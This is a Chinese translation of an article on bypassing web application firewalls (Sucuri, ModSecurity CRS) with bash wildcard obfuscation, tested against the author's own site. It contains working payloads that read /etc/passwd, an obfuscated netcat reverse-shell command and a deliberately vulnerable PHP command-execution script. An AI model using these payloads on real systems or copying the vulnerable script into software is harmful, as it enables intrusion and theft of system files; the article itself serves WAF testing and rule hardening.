> 原文链接: https://www.anquanke.com//post/id/145518 


# web应用防火墙逃逸技术（一）


                                阅读量   
                                **161852**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://medium.com/
                                <br>原文地址：[https://medium.com/secjuice/waf-evasion-techniques-718026d693d8](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01bbb663e75812e1e6.jpg)](https://p5.ssl.qhimg.com/t01bbb663e75812e1e6.jpg)

### 传送门： [web应用防火墙逃逸技术（二）](https://www.anquanke.com/post/id/145542)

## 前记

在Web应用程序中发现远程命令执行漏洞并不罕见，并且”注入”被公认为”2017 OWASP Top 10”之首<br>
当不可信数据作为命令或查询的一部分发送给解释器时，会发生注入漏洞：如SQL，NoSQL，OS和LDAP注入。<br>
攻击者的恶意数据可能会诱使解释器执行意外的命令或在未经适当授权的情况下访问数据。<br>
所有现代Web应用防火墙都能够拦截（甚至阻止）RCE的测试，但是当它发生在Linux系统中时，我们有很多方法可以规避WAF规则集。它的名字是”通配符”。在开始做WAPT之前，我想向你展示一些你可能不知道的有关bash和通配符的知识。



## 你可能不知道的通配符

Bash标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。有关标准通配符的更多信息，请参阅手册页man 7 glob。并不是每个人都知道有很多bash语法可以让你使用问号”?”，正斜杠”/“，数字和字母来执行系统命令。<br>
您甚至可以使用相同数量的字符枚举文件并获取其内容。我举几个例子：<br>
取而代之`ls`命令，你可以使用下面的语法：

```
/???/?s
```

[![](https://p0.ssl.qhimg.com/t01d35807f37d4ff597.png)](https://p0.ssl.qhimg.com/t01d35807f37d4ff597.png)<br>
用这种语法，你可以执行基本上你想要的任何事情。假设您的易受攻击目标位于Web应用程序防火墙之后，并且此WAF有一条规则，该规则可阻止包含GET参数`/etc/passwd`或`/bin/ls`内部值的所有请求，或在POST请求中阻止所有请求内部值的请求。如果你试图提出一个请求，`/?cmd=cat+/etc/passwd`它会被目标WAF阻止，你的IP将被永久禁止。但是你的口袋里有一把叫做通配符的秘密武器。如果你幸运的话（我们后面会看到，可能没那么幸运）目标WAF没有足够的级别来阻止像`?`和`/`在查询字符串中。那么你可以很容易构造你的payload像这样：`/?cmd=%2f???%2f??t%20%2f???%2fp??s??`<br>[![](https://p4.ssl.qhimg.com/t016174bf49621f39f0.png)](https://p4.ssl.qhimg.com/t016174bf49621f39f0.png)<br>
正如你在上面的截图中看到的，有3个错误`/ bin / cat *：是一个目录`。发生这种情况是因为`/???/??t`可以通过globbing过程转换，可被转化为`/bin/cat`，也可以是`/dev/net`或者`/etc/apt`等……<br>
问号通配符只代表一个字符，可以是任何字符。因此，如果你知道文件名的一部分，那么你可以使用这个通配符。例如，`ls *.???`会列出当前目录中所有文件的长度为3个字符的扩展名。<br>
因此将列出具有诸如`.gif，.jpg，.txt`之类的扩展名的文件。<br>
使用这个通配符，你可以使用netcat执行一个反向shell。假设您需要在端口1337<br>
（通常`nc -e /bin/bash 127.0.0.1 1337`）执行127.0.0.1的反向shell ，您可以使用如下语法来执行此操作：<br>`/???/n? -e /???/b??h 2130706433 1337`<br>
以long格式（2130706433）转换IP地址127.0.0.1，可以避免在HTTP请求中使用”点”字符。<br>
在我的kali中我需要使用`nc.traditional`，以便`/bin/bash`连接后执行。payload变成这样：

```
/???/?c.??????????? -e /???/b??h 2130706433 1337
```

[![](https://p2.ssl.qhimg.com/t0197eb5c5ebddb6ae7.gif)](https://p2.ssl.qhimg.com/t0197eb5c5ebddb6ae7.gif)<br>
总结了我们刚才看到的两个命令：<br>
标准：`/bin/nc 127.0.0.1 1337`<br>
bypass：`/???/n? 2130706433 1337`<br>
使用字符：`/ ? n [0-9]`

标准：`/bin/cat /etc/passwd`<br>
bypass：`/???/??t /???/??ss??`<br>
使用字符：`/ ? t s`<br>
为什么要用`?`而不是`*?`因为星号（**）被广泛用于评论语法（类似于`/ **嗨，我是注释** /`），并且许多WAF会阻止它为了避免SQL注入,类似于`UNION + SELECT + 1,2,3 / **`枚举文件和目录使用`echo？`。该echo命令可以使用通配符枚举文件系统上的文件和目录。例如`echo /**/**ss*`<br>[![](https://p2.ssl.qhimg.com/t01549b8f4473497823.png)](https://p2.ssl.qhimg.com/t01549b8f4473497823.png)<br>
这可以在RCE上使用，以获取目标系统上的文件和目录，例如：<br>[![](https://p5.ssl.qhimg.com/t0164f83d5867c95bb2.png)](https://p5.ssl.qhimg.com/t0164f83d5867c95bb2.png)<br>
但为什么使用通配符（特别是问号）可以规避WAF规则集？让我从Sucuri WAF开始吧！



## Sucuri WAF 逃逸

[![](https://p4.ssl.qhimg.com/t011d9eb143e377cd52.png)](https://p4.ssl.qhimg.com/t011d9eb143e377cd52.png)<br>
测试WAF规则集的最佳方法是哪一种？<br>
创建世界上最脆弱的PHP脚本并尝试所有可能的技巧！在上面的屏幕截图中，我们有：<br>
在左上窗格中有我简陋的Web应用程序（它只是一个执行命令的PHP脚本）：

```
&lt;?php
      echo 'ok: ';
      print_r($_GET['c']);
      system($_GET['c']);

```

在左下方的窗格中，您可以在我的网站上看到由`Sucuri WAF（test1.unicresit.it）`保护的远程命令执行测试。正如您所看到的，Sucuri以原因:检测到尝试的RFI/LFI请求，阻止了您的请求。<br>
右窗格是最有趣的，因为它显示相同的请求，但使用`?`作为通配符。结果令人害怕<br>
Sucuri WAF接受了这个请求，我的应用程序执行了我放入c参数的命令。现在我可以读取`/etc/passwd`文件，甚至更多…<br>
我可以阅读应用程序本身的PHP源代码，我可以使用`netcat`来执行反向shell`/???/?c`，或者我可以用curl或wget按顺序执行程序以显示网络服务器的真实IP地址，使我能够通过直接连接到目标来绕过WAF。<br>
但必须要澄清，我正在使用不代表真实场景的简陋PHP脚本进行此测试。恕我直言，你不应该根据它阻止多少请求来判断一个WAF，而且Sucuri不会因为不能完全保护一个故意容易受到攻击的网站而变得不那么安全。



## ModSecurity OWASP CRS 3.0

我真的很喜欢ModSecurity，我认为用于Nginx和Nginx连接器的新libmodsecurity（v3）是我用来部署Web应用程序防火墙的最佳解决方案。我也是OWASP核心规则集的忠实粉丝！我在任何地方都使用它，但是，如果你不太了解这个规则集，你需要注意一个叫做love的东西..emmmm，不好意思，是Paranoia Level！



## Paranoia Level

您可以在这里找到以下”架构”,其很好地概述了每个级别在”REQUEST PROTOCOL ENFORCEMENT”规则上的工作原理。<br>
正如你用PL1所看到的，一个查询字符串只能包含1-255范围内的ASCII字符，并且它变得更具限制性，直到PL4在非常小的范围内阻止所有不是ASCII字符的参数。

```
# -=[ Targets and ASCII Ranges ]=-
#
# 920270: PL1
# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
# ASCII: 1-255
# Example: Full ASCII range without null character
#
# 920271: PL2
# REQUEST_URI, REQUEST_HEADERS, ARGS and ARGS_NAMES
# ASCII: 9,10,13,32-126,128-255
# Example: Full visible ASCII range, tab, newline
#
# 920272: PL3
# REQUEST_URI, REQUEST_HEADERS, ARGS, ARGS_NAMES, REQUEST_BODY
# ASCII: 32-36,38-126
# Example: Visible lower ASCII range without percent symbol
#
# 920273: PL4
# ARGS, ARGS_NAMES and REQUEST_BODY
# ASCII: 38,44-46,48-58,61,65-90,95,97-122
# Example: A-Z a-z 0-9 = - _ . , : &amp;
#
# 920274: PL4
# REQUEST_HEADERS without User-Agent, Referer, Cookie
# ASCII: 32,34,38,42-59,61,65-90,95,97-122
# Example: A-Z a-z 0-9 = - _ . , : &amp; " * + / SPACE
```

让我们来做一些测试吧！



## Paranoia Level 0（PL0）

Paranoia Level 0意味着许多规则被禁用，所以我们的payload可以导致远程命令执行没有任何问题。不要惊慌:)

```
SecAction "id:999,
phase:1,
nolog,
pass,
t:none,
setvar:tx.paranoia_level=0"
```

[![](https://p2.ssl.qhimg.com/t01a4713b374f92f1a4.png)](https://p2.ssl.qhimg.com/t01a4713b374f92f1a4.png)<br>
ModSecurity中的Paranoia Level 0意味着”高质量的完美规则，几乎没有误报”，但它也过于宽容。您可以在netnea网站上找到按Paranoia级别分组的规则列表：`https：//www.netnea.com/cms/core-rule-set-inventory/`



## Paranoia Level 1&amp;2（PL1，PL2）

我已经将级别1和级别2分组，因为它们的差异（如您在上面的模式中所见）不会影响我们的目标，所有行为都与以下所述相同。

```
SecAction "id:999,
phase:1,
nolog,
pass,
t:none,
setvar:tx.paranoia_level=1"
```

PL1（和PL2）ModSecurity显然阻止了我对”OS文件访问尝试（930120）”的请求。但是如果我使用问号作为通配符呢？该申请被我的WAF接受：<br>[![](https://p4.ssl.qhimg.com/t01481a175b7a8bc011.png)](https://p4.ssl.qhimg.com/t01481a175b7a8bc011.png)<br>
发生这种情况是因为“问号”，“正斜杠”和“空格”在规则920271和920272中的可接受字符范围内。此外，使用“问号”而不是命令语法使我能够避开拦截操作系统的常用命令和文件（例如，在我们的例子中为`/etc/passwd`）的”操作系统文件”筛选器，。



## Paranoia Level 3（PL3）

这种Paranoia Level 3水平有一个好处：它阻止包含`?`等字符超过n次的请求。实际上，我的请求被封锁为”字符异常检测警报”。这很酷！不错的工作ModSecurity，你赢了！<br>
但不幸的是，我的Web应用程序非常简陋，容易受到攻击，因此我可以使用较少的问号并使用以下语法读取passwd文件：`c=/?in/cat+/et?/passw?`<br>[![](https://p4.ssl.qhimg.com/t0102d96f9d5ef5476f.png)](https://p4.ssl.qhimg.com/t0102d96f9d5ef5476f.png)<br>
正如你所看到的，只用3个`?`，我可以逃避这个Paranoia Level，并读取目标系统中的passwd文件。好吧，这并不意味着你必须始终无条件地将你的Paranoia Level设置为4。请记住，我用一个非常愚蠢的PHP脚本来测试它并不代表真实的场景



## Paranoia Level 4（PL4）

基本上没有逃逸办法，至少我不能。范围之外的所有字符`a-z A-Z 0–9`都被阻止！没办法！相信我，当你需要执行命令来读取文件时，有90％的概率需要“空格”字符或“正斜杠”



## 最后的想法

返回到静态HTML页面<br>
这是提高Web应用程序安全性的最快方法！很难说什么是避免WAF逃避的最佳配置，或者什么是最好的Paranoia Level。但我可以说，恕我直言，我们不应该信任在Web应用程序上均匀分布的规则集。事实上，我认为我们应该配置我们的WAF规则，每个应用程序功能都是上下文化的。<br>
无论如何，当你在你的ModSecurity或类似的东西上编写一个新的SecRule时，请记住，可能有很多方法来绕过你的过滤或者正则表达式。
